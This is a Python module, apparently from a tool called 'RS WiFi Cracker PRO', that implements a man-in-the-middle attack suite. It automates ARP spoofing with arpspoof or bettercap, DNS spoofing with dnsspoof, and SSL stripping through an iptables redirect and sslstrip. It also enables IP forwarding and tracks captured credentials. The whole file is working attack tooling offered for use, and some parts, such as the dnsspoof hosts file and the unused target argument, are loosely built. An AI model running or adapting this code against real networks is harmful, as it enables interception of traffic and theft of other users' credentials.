#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""RS WiFi Cracker PRO v4.0 - MITM Attack Module"""

import os
import sys
import time
import subprocess
import threading
import queue
from typing import Dict, List, Optional
from dataclasses import dataclass
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from utils.logger import Logger

logger = Logger('MITM')


@dataclass
class InterceptedData:
    type: str
    source: str
    destination: str
    content: str
    timestamp: str = ""


class MITMAttacker:
    """Man-in-the-Middle Attack Suite"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.processes = []
        self.intercept_queue = queue.Queue()
        self.stats = {'packets': 0, 'credentials': 0}
    
    def start(self, target, attack_type: str = "arp") -> bool:
        """Start MITM attack"""
        self.running = True
        
        if attack_type == "arp":
            return self._arp_spoof()
        elif attack_type == "dns":
            return self._dns_spoof()
        elif attack_type == "sslstrip":
            return self._sslstrip()
        elif attack_type == "full":
            return self._full_suite()
        
        return False
    
    def _arp_spoof(self) -> bool:
        """ARP spoofing"""
        try:
            gateway = self._get_gateway()
            target_ip = self._get_target_ip()
            
            if not gateway or not target_ip:
                return False
            
            self._enable_forwarding()
            
            # Start arpspoof
            cmd1 = ['arpspoof', '-i', self.interface, '-t', target_ip, gateway]
            cmd2 = ['arpspoof', '-i', self.interface, '-t', gateway, target_ip]
            
            for cmd in [cmd1, cmd2]:
                process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.processes.append(process)
            
            return True
        except FileNotFoundError:
            return self._bettercap_mitm()
        except:
            return False
    
    def _dns_spoof(self) -> bool:
        """DNS spoofing"""
        self._arp_spoof()
        
        hosts_file = '/tmp/dns_hosts'
        with open(hosts_file, 'w') as f:
            f.write('10.0.0.1 *.com\n*.net\n')
        
        try:
            process = subprocess.Popen(
                ['dnsspoof', '-i', self.interface, '-f', hosts_file],
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True
            )
            self.processes.append(process)
            return True
        except:
            return False
    
    def _sslstrip(self) -> bool:
        """SSL stripping"""
        self._arp_spoof()
        
        self._enable_forwarding()
        subprocess.run(f'sudo iptables -t nat -A PREROUTING -i {self.interface} -p tcp --dport 80 -j REDIRECT --to-port 8080',
                      shell=True, capture_output=True)
        
        try:
            process = subprocess.Popen(
                ['sslstrip', '-l', '8080'],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            self.processes.append(process)
            return True
        except:
            return False
    
    def _full_suite(self) -> bool:
        """Full MITM suite"""
        self._arp_spoof()
        self._dns_spoof()
        self._sslstrip()
        return True
    
    def _bettercap_mitm(self) -> bool:
        """Use bettercap for MITM"""
        try:
            process = subprocess.Popen(
                ['bettercap', '-iface', self.interface],
                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True
            )
            process.stdin.write('arp.spoof on\nnet.sniff on\n')
            process.stdin.flush()
            self.processes.append(process)
            return True
        except:
            return False
    
    def _get_gateway(self) -> Optional[str]:
        try:
            result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'default' in line:
                    return line.split()[2]
        except:
            pass
        return None
    
    def _get_target_ip(self) -> Optional[str]:
        try:
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'ether' in line.lower():
                    parts = line.split()
                    for p in parts:
                        if '.' in p and p[0].isdigit():
                            return p
        except:
            pass
        return None
    
    def _enable_forwarding(self):
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')
        except:
            pass
    
    def get_intercepted(self) -> Optional[InterceptedData]:
        try:
            return self.intercept_queue.get_nowait()
        except queue.Empty:
            return None
    
    def stop(self):
        self.running = False
        for p in self.processes:
            p.terminate()
        subprocess.run('sudo iptables -F', shell=True, capture_output=True)
        subprocess.run('sudo iptables -t nat -F', shell=True, capture_output=True)
    
    def get_stats(self) -> Dict: return self.stats.copy()
